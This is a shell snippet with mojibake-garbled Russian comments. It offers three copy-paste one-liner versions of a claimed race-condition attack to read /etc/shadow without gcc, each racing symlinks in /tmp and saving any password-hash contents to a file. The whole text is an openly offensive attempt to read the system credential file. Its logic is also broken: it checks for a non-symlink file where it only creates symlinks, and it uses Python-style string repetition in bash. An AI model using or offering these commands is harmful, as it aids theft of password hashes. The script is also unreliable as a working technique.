# üéØ –û–î–ù–ê –ö–û–ú–ê–ù–î–ê –ë–ï–ó GCC (–£–õ–£–ß–®–ï–ù–ù–ê–Ø): Race Condition –∞—Ç–∞–∫–∞ –¥–ª—è —á—Ç–µ–Ω–∏—è /etc/shadow
# –°–∫–æ–ø–∏—Ä—É–π—Ç–µ –∏ –≤—Å—Ç–∞–≤—å—Ç–µ —ç—Ç—É –∫–æ–º–∞–Ω–¥—É –≤ —Ç–µ—Ä–º–∏–Ω–∞–ª:

echo "üöÄ RACE CONDITION –ë–ï–ó GCC" && rm -f /tmp/race_symlink /tmp/race_success.txt && echo "test" > /tmp/race_target && (for i in {1..2000}; do rm -f /tmp/race_symlink; ln -sf /etc/shadow /tmp/race_symlink; usleep 100; done) & (for i in {1..2000}; do if [ -f /tmp/race_symlink ] && [ ! -L /tmp/race_symlink ]; then if head -1 /tmp/race_symlink 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; usleep 100; done) && wait && echo "‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!" && if [ -f /tmp/race_success.txt ]; then echo "üîç –°–û–î–ï–†–ñ–ò–ú–û–ï –ü–†–û–ß–ò–¢–ê–ù–ù–û–ì–û –§–ê–ô–õ–ê /etc/shadow:"; echo "="*60; cat /tmp/race_success.txt; echo "="*60; else echo "‚ùå –ê—Ç–∞–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å"; fi && rm -f /tmp/race_target /tmp/race_symlink

# =============================================================================
# –ê–õ–¨–¢–ï–†–ù–ê–¢–ò–í–ù–ê–Ø –í–ï–†–°–ò–Ø (—Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º sleep –≤–º–µ—Å—Ç–æ usleep):
# =============================================================================

echo "üöÄ RACE CONDITION –ë–ï–ó GCC (SLEEP)" && rm -f /tmp/race_symlink /tmp/race_success.txt && echo "test" > /tmp/race_target && (for i in {1..1000}; do rm -f /tmp/race_symlink; ln -sf /etc/shadow /tmp/race_symlink; sleep 0.0001; done) & (for i in {1..1000}; do if [ -f /tmp/race_symlink ] && [ ! -L /tmp/race_symlink ]; then if head -1 /tmp/race_symlink 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; sleep 0.0001; done) && wait && echo "‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!" && if [ -f /tmp/race_success.txt ]; then echo "üîç –°–û–î–ï–†–ñ–ò–ú–û–ï –ü–†–û–ß–ò–¢–ê–ù–ù–û–ì–û –§–ê–ô–õ–ê /etc/shadow:"; echo "="*60; cat /tmp/race_success.txt; echo "="*60; else echo "‚ùå –ê—Ç–∞–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å"; fi && rm -f /tmp/race_target /tmp/race_symlink

# =============================================================================
# –°–ê–ú–ê–Ø –ü–†–û–°–¢–ê–Ø –í–ï–†–°–ò–Ø (–±–µ–∑ –∑–∞–¥–µ—Ä–∂–µ–∫):
# =============================================================================

echo "üöÄ RACE CONDITION –ë–ï–ó GCC (–ü–†–û–°–¢–ê–Ø)" && rm -f /tmp/race_symlink /tmp/race_success.txt && echo "test" > /tmp/race_target && (for i in {1..5000}; do rm -f /tmp/race_symlink; ln -sf /etc/shadow /tmp/race_symlink; done) & (for i in {1..5000}; do if [ -f /tmp/race_symlink ] && [ ! -L /tmp/race_symlink ]; then if head -1 /tmp/race_symlink 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) && wait && echo "‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!" && if [ -f /tmp/race_success.txt ]; then echo "üîç –°–û–î–ï–†–ñ–ò–ú–û–ï –ü–†–û–ß–ò–¢–ê–ù–ù–û–ì–û –§–ê–ô–õ–ê /etc/shadow:"; echo "="*60; cat /tmp/race_success.txt; echo "="*60; else echo "‚ùå –ê—Ç–∞–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å"; fi && rm -f /tmp/race_target /tmp/race_symlink 
